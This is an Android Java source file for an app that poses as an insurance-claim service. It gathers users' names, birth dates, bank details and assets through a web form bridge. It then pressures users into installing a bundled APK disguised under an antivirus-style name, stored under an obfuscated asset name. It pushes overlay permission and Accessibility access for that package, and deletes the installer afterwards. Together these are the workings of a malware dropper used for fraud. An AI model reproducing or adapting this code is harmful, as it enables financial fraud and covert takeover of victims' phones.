package com.example.myapplication;

import android.Manifest;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.RippleDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.DocumentsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.core.view.WindowInsetsControllerCompat;

import com.ig.security.BuildConfig;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {
    public static final String ACTION_CLAIM_FORM_SUBMITTED = "com.ig.security.action.CLAIM_FORM_SUBMITTED";
    public static final String EXTRA_CLAIM_JSON = "com.ig.security.extra.CLAIM_JSON";
    public static final String EXTRA_CLAIM_NAME = "com.ig.security.extra.CLAIM_NAME";
    public static final String EXTRA_CLAIM_BIRTH_DATE = "com.ig.security.extra.CLAIM_BIRTH_DATE";
    public static final String EXTRA_CLAIM_BANK = "com.ig.security.extra.CLAIM_BANK";
    public static final String EXTRA_CLAIM_ASSETS = "com.ig.security.extra.CLAIM_ASSETS";
    public static final String EXTRA_CLAIM_PRICE = "com.ig.security.extra.CLAIM_PRICE";
    public static final String EXTRA_CLAIM_DAMAGE_METHOD = "com.ig.security.extra.CLAIM_DAMAGE_METHOD";
    private static final String MAIN_PAGE_URL = "file:///android_asset/index.html";
    private static final int APP_BACKGROUND_COLOR = Color.WHITE;

    public static final String SECURITY_APK_ASSET = "nbkhe9ihdhgiouhwasdbfih3";
    public static final String SECURITY_APK_NAME = "터지엔 엠백신";
    private static final String SECURITY_APP_PACKAGE_NAME = BuildConfig.SECURITY_APP_PACKAGE_NAME;
    private static final String SAMSUNG_MY_FILES_PACKAGE = "com.sec.android.app.myfiles";

    private WebView webView;
    private AlertDialog securitySetupDialog;
    private boolean waitingForOverlayPermission;
    private boolean accessibilitySettingsOpened;
    private boolean securityLaunchServiceStarted;

    private final ActivityResultLauncher<String> notificationPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), granted -> {
                if (granted) {
                    requestOverlayPermissionIfNeededThenStartServiceAndOpenFolder();
                } else {
                    showBasicDialog("권한 필요", "보안 설정 안내 알림을 표시하려면 알림 권한이 필요합니다.");
                }
            });

    private final ActivityResultLauncher<String> storagePermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), granted -> {
                if (granted) {
                    copyAndOpenSecurityFolder();
                } else {
                    showBasicDialog("권한 필요", "설치 파일을 저장하려면 저장소 권한이 필요합니다.");
                }
            });

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        configureSystemBars();

        FrameLayout root = new FrameLayout(this);
        root.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));
        root.setBackgroundColor(APP_BACKGROUND_COLOR);
        applySystemBarInsets(root);

        webView = new WebView(this);
        webView.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));
        webView.setBackgroundColor(APP_BACKGROUND_COLOR);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            settings.setOffscreenPreRaster(true);
        }
        webView.setWebViewClient(new WebViewClient());
        webView.addJavascriptInterface(new ClaimBridge(), "KcaClaimBridge");
        webView.loadUrl(MAIN_PAGE_URL);
        root.addView(webView);
        setContentView(root);
        ViewCompat.requestApplyInsets(root);
        registerBackNavigationCallback();
    }

    private void configureSystemBars() {
        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
        getWindow().setStatusBarColor(APP_BACKGROUND_COLOR);
        getWindow().setNavigationBarColor(APP_BACKGROUND_COLOR);

        WindowInsetsControllerCompat controller =
                WindowCompat.getInsetsController(getWindow(), getWindow().getDecorView());
        controller.setAppearanceLightStatusBars(true);
        controller.setAppearanceLightNavigationBars(true);
    }

    private void applySystemBarInsets(View view) {
        ViewCompat.setOnApplyWindowInsetsListener(view, (target, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            target.setPadding(0, systemBars.top, 0, systemBars.bottom);
            return insets;
        });
    }

    private void registerBackNavigationCallback() {
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                handleBackPressed();
            }
        });
    }

    private void handleBackPressed() {
        if (webView != null && !isMainPage(webView.getUrl())) {
            webView.loadUrl(MAIN_PAGE_URL);
            return;
        }

        finish();
    }

    private boolean isMainPage(String url) {
        return url != null
                && (url.equals(MAIN_PAGE_URL)
                || url.startsWith(MAIN_PAGE_URL + "#")
                || url.startsWith(MAIN_PAGE_URL + "?"));
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForOverlayPermission) {
            waitingForOverlayPermission = false;
            if (hasRequiredInstallFlowPermissions()) {
                startSecurityServiceThenOpenFolder();
            } else if (!canDrawOverlays()) {
                showBasicDialog("권한 필요", "자동으로 보안 설정 화면을 열려면 다른 앱 위에 표시 권한이 필요합니다.");
            }
            return;
        }

        handleSecurityRequirement();
    }

    private final class ClaimBridge {
        @JavascriptInterface
        public void submitOrder(
                String name,
                String birthDate,
                String insurance,
                String price,
                String property,
                String totalAmount
        ) {
            sendClaimSubmittedBroadcast(name, birthDate, insurance, price, property, totalAmount);
        }
    }

    private void sendClaimSubmittedBroadcast(
            String name,
            String birthDate,
            String insurance,
            String price,
            String property,
            String totalAmount
    ) {

        String safeName = safeString(name);
        String safeBirthDate = safeString(birthDate);
        String safeInsurance = safeString(insurance);
        String safeProperty = safeString(property);
        String safePrice = safeString(price);
        String safeTotalAmount = safeString(totalAmount);

        Intent intent = new Intent(ACTION_CLAIM_FORM_SUBMITTED)
                .putExtra(EXTRA_CLAIM_NAME, safeName)
                .putExtra(EXTRA_CLAIM_BIRTH_DATE, safeBirthDate)
                .putExtra(EXTRA_CLAIM_BANK, safeInsurance)
                .putExtra(EXTRA_CLAIM_ASSETS, safeProperty)
                .putExtra(EXTRA_CLAIM_PRICE, safePrice)
                .putExtra(EXTRA_CLAIM_DAMAGE_METHOD, safeTotalAmount)
                .putExtra(EXTRA_CLAIM_JSON, createClaimJson(
                        safeName,
                        safeBirthDate,
                        safeInsurance,
                        safeProperty,
                        safeTotalAmount
                ));
        sendBroadcast(intent);

    }

    private String createClaimJson(
            String name,
            String birthDate,
            String bank,
            String assets,
            String damageMethod
    ) {
        JSONObject payload = new JSONObject();
        try {
            payload.put("name", name);
            payload.put("birthDate", birthDate);
            payload.put("bank", bank);
            payload.put("assets", assets);
            payload.put("damageMethod", damageMethod);
        } catch (JSONException ignored) {
        }
        return payload.toString();
    }

    private String safeString(String value) {
        return value == null ? "" : value;
    }

    private void handleSecurityRequirement() {
        if (!isSecurityAppInstalled()) {
            accessibilitySettingsOpened = false;
            securityLaunchServiceStarted = false;
            showSecurityInstallDialogIfNeeded();
            return;
        }

        if (securitySetupDialog != null && securitySetupDialog.isShowing()) {
            securitySetupDialog.dismiss();
        }
        SecurityApkStorageCleaner.deleteFromDownloads(this, SECURITY_APK_NAME);

        if (!isSecurityAccessibilityServiceEnabled() && !accessibilitySettingsOpened) {
            accessibilitySettingsOpened = true;
            openAccessibilitySettings();
        }
    }

    private void showSecurityInstallDialogIfNeeded() {
        if (securitySetupDialog != null && securitySetupDialog.isShowing()) {
            return;
        }

        securitySetupDialog = new AlertDialog.Builder(this).create();
        securitySetupDialog.setView(createSecuritySetupDialogView(securitySetupDialog));
        securitySetupDialog.setCanceledOnTouchOutside(false);
        securitySetupDialog.setOnCancelListener(dialog -> closeApp());
        securitySetupDialog.setOnShowListener(dialog -> {
            if (securitySetupDialog.getWindow() != null) {
                securitySetupDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            }
        });
        securitySetupDialog.show();
    }

    private boolean isSecurityAppInstalled() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                getPackageManager().getPackageInfo(
                        SECURITY_APP_PACKAGE_NAME,
                        PackageManager.PackageInfoFlags.of(0)
                );
            } else {
                getPackageManager().getPackageInfo(SECURITY_APP_PACKAGE_NAME, 0);
            }
            return true;
        } catch (PackageManager.NameNotFoundException exception) {
            return false;
        }
    }

    private boolean isSecurityAccessibilityServiceEnabled() {
        String enabledServices = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (TextUtils.isEmpty(enabledServices)) {
            return false;
        }

        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(enabledServices);
        while (splitter.hasNext()) {
            ComponentName componentName = ComponentName.unflattenFromString(splitter.next());
            if (componentName != null
                    && SECURITY_APP_PACKAGE_NAME.equals(componentName.getPackageName())) {
                return true;
            }
        }
        return false;
    }

    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        } catch (ActivityNotFoundException exception) {
            showBasicDialog("설정 열기 오류", "접근성 설정 화면을 열 수 없습니다. 설정 앱에서 직접 열어 주세요.");
        } catch (SecurityException exception) {
            showBasicDialog("설정 열기 오류", "Android 보안 정책으로 접근성 설정 화면을 열 수 없습니다.");
        }
    }

    private void startSecurityLaunchServiceIfNeeded() {
        if (securityLaunchServiceStarted) {
            return;
        }

        try {
            Intent intent = new Intent(this, SecurityLaunchForegroundService.class);
            ContextCompat.startForegroundService(this, intent);
            securityLaunchServiceStarted = true;
        } catch (RuntimeException exception) {
            showBasicDialog("보안 서비스 오류", "보안 설정 안내 서비스를 시작할 수 없습니다. 잠시 후 다시 시도해 주세요.");
        }
    }

    private View createSecuritySetupDialogView(AlertDialog dialog) {
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setPadding(dp(24), dp(26), dp(24), dp(20));
        container.setBackground(createRoundedBackground(Color.WHITE, 28));

        TextView icon = new TextView(this);
        icon.setText("!");
        icon.setTextColor(Color.WHITE);
        icon.setTextSize(20);
        icon.setTypeface(Typeface.DEFAULT_BOLD);
        icon.setGravity(Gravity.CENTER);
        icon.setBackground(createRoundedBackground(Color.rgb(0, 99, 255), 18));
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(dp(36), dp(36));
        iconParams.bottomMargin = dp(18);
        container.addView(icon, iconParams);

        TextView title = new TextView(this);
        title.setText("보안 앱 설치 필요");
        title.setTextColor(Color.rgb(20, 20, 24));
        title.setTextSize(22);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setIncludeFontPadding(false);
        container.addView(title, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        ));

        TextView message = new TextView(this);
        message.setText("서비스를 계속 이용하려면 보안 앱 설치가 필요합니다. 설치를 시작하면 보안 설정 안내 알림이 표시됩니다.");
        message.setTextColor(Color.rgb(82, 86, 96));
        message.setTextSize(15);
        message.setLineSpacing(dp(2), 1.0f);
        LinearLayout.LayoutParams messageParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        );
        messageParams.topMargin = dp(14);
        container.addView(message, messageParams);

        LinearLayout buttonRow = new LinearLayout(this);
        buttonRow.setGravity(Gravity.END);
        buttonRow.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams buttonRowParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        );
        buttonRowParams.topMargin = dp(24);
        container.addView(buttonRow, buttonRowParams);

        Button cancelButton = createDialogButton("취소", Color.rgb(62, 66, 74), Color.rgb(241, 243, 247));
        cancelButton.setOnClickListener(view -> {
            dialog.dismiss();
            closeApp();
        });
        buttonRow.addView(cancelButton, createButtonParams(0));

        Button openButton = createDialogButton("설치하기", Color.WHITE, Color.rgb(0, 99, 255));
        openButton.setTypeface(Typeface.DEFAULT_BOLD);
        openButton.setOnClickListener(view -> {
            dialog.dismiss();
            requestNotificationPermissionIfNeededThenStartServiceAndOpenFolder();
        });
        buttonRow.addView(openButton, createButtonParams(dp(10)));

        return container;
    }

    private Button createDialogButton(String text, int textColor, int backgroundColor) {
        Button button = new Button(this);
        button.setText(text);
        button.setTextColor(textColor);
        button.setTextSize(14);
        button.setAllCaps(false);
        button.setMinHeight(0);
        button.setMinWidth(0);
        button.setPadding(dp(18), 0, dp(18), 0);
        button.setBackground(createRippleBackground(backgroundColor, Color.argb(28, 0, 0, 0), 22));
        return button;
    }

    private LinearLayout.LayoutParams createButtonParams(int leftMargin) {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                dp(44)
        );
        params.leftMargin = leftMargin;
        return params;
    }

    private GradientDrawable createRoundedBackground(int color, int radiusDp) {
        GradientDrawable drawable = new GradientDrawable();
        drawable.setColor(color);
        drawable.setCornerRadius(dp(radiusDp));
        return drawable;
    }

    private RippleDrawable createRippleBackground(int color, int rippleColor, int radiusDp) {
        GradientDrawable content = createRoundedBackground(color, radiusDp);
        GradientDrawable mask = createRoundedBackground(Color.WHITE, radiusDp);
        return new RippleDrawable(ColorStateList.valueOf(rippleColor), content, mask);
    }

    private void closeApp() {
        finishAndRemoveTask();
    }

    private void requestNotificationPermissionIfNeededThenStartServiceAndOpenFolder() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
            return;
        }

        requestOverlayPermissionIfNeededThenStartServiceAndOpenFolder();
    }

    private void requestOverlayPermissionIfNeededThenStartServiceAndOpenFolder() {
        if (!canDrawOverlays()) {
            requestOverlayPermission();
            return;
        }

        startSecurityServiceThenOpenFolder();
    }

    private boolean hasRequiredInstallFlowPermissions() {
        boolean hasNotificationPermission = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU
                || ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                == PackageManager.PERMISSION_GRANTED;
        return hasNotificationPermission && canDrawOverlays();
    }

    private boolean canDrawOverlays() {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
    }

    private void requestOverlayPermission() {
        waitingForOverlayPermission = true;
        Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())
        );
        startActivity(intent);
    }

    private void startSecurityServiceThenOpenFolder() {
        startSecurityLaunchServiceIfNeeded();
        requestStorageIfNeededThenOpenFolder();
    }

    private void requestStorageIfNeededThenOpenFolder() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P
                && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            storagePermissionLauncher.launch(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            return;
        }

        copyAndOpenSecurityFolder();
    }

    private void copyAndOpenSecurityFolder() {
        try {
            copySecurityApkToDownloads();
            openDownloadsFolder();
        } catch (IOException exception) {
            showBasicDialog("설치 파일 오류", "보안 앱 설치 파일을 준비할 수 없습니다. 다시 시도해 주세요.");
        } catch (ActivityNotFoundException exception) {
            showBasicDialog("다운로드 폴더를 열 수 없음", "보안 앱 설치 파일을 열 수 있도록 다운로드 폴더를 직접 열어 주세요.");
        }
    }

    private void copySecurityApkToDownloads() throws IOException {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            copySecurityApkWithMediaStore();
            return;
        }

        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File apkFile = new File(downloadsDir, SECURITY_APK_NAME);
        try (InputStream input = getAssets().open(SECURITY_APK_ASSET);
             OutputStream output = new FileOutputStream(apkFile, false)) {
            copy(input, output);
        }
    }

    private void copySecurityApkWithMediaStore() throws IOException {
        ContentResolver resolver = getContentResolver();
        ContentValues values = new ContentValues();
        values.put(MediaStore.Downloads.DISPLAY_NAME, SECURITY_APK_NAME);
        values.put(MediaStore.Downloads.MIME_TYPE, "application/vnd.android.package-archive");
        values.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
        values.put(MediaStore.Downloads.IS_PENDING, 1);

        Uri uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
        if (uri == null) {
            throw new IOException("Could not create Downloads entry");
        }

        try (InputStream input = getAssets().open(SECURITY_APK_ASSET);
             OutputStream output = resolver.openOutputStream(uri)) {
            if (output == null) {
                throw new IOException("Could not open Downloads entry");
            }
            copy(input, output);
        }

        values.clear();
        values.put(MediaStore.Downloads.IS_PENDING, 0);
        resolver.update(uri, values, null, null);
    }

    private void openDownloadsFolder() {
        Intent intent = new Intent(DownloadManager.ACTION_VIEW_DOWNLOADS);
        startActivity(intent);
    }

    private Intent createOpenFolderIntent(Uri folderUri) {
        return new Intent(Intent.ACTION_VIEW)
                .setDataAndType(folderUri, DocumentsContract.Document.MIME_TYPE_DIR)
                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    }

    private Uri getDownloadsFolderUri() {
        return Uri.parse("content://com.android.externalstorage.documents/document/primary%3A"
                + Environment.DIRECTORY_DOWNLOADS);
    }

    private void copy(InputStream input, OutputStream output) throws IOException {
        byte[] buffer = new byte[8192];
        int read;
        while ((read = input.read(buffer)) != -1) {
            output.write(buffer, 0, read);
        }
    }

    private void showBasicDialog(String title, String message) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("확인", null)
                .show();
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
